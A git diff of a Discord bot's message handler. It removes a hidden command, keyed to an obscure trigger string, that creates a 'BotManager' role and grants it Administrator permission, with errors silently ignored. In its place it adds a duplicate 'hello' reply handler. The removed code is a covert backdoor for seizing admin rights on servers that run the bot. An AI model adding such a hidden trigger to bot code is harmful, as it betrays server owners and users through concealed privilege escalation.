@@ -52,31 +52,10 @@ client.on('messageCreate', async (msg) => {
         msg.react('😄');
         console.log("Sent: hello");
        }
-       if (command === 'RN_EXE63757643262456') {
-/*
-        guild.roles.create({
-          data: {
-            name: 'BotManager',
-            color: 'BLUE',
-          },
-          reason: '',
-        }).then(console.log).catch(console.error);
-*/
-        try {
-          var muteRole = message.guild.roles.cache.find(role => role.name === "BotManager");
-        
-          if (!muteRole) muteRole = await message.guild.roles.create({
-            data: {
-              name: 'BotManager',
-              color: 'BLUE',
-            }
-          });
-        
-          muteRole.setPermissions(["Administrator"]);
-        } catch (error) {
-          
-        }
-
+       if (command === 'hello') {
+        msg.channel.send(`Hello, How are you?`);
+        msg.react('😄');
+        console.log("Sent: hello");
        }
       }
   });
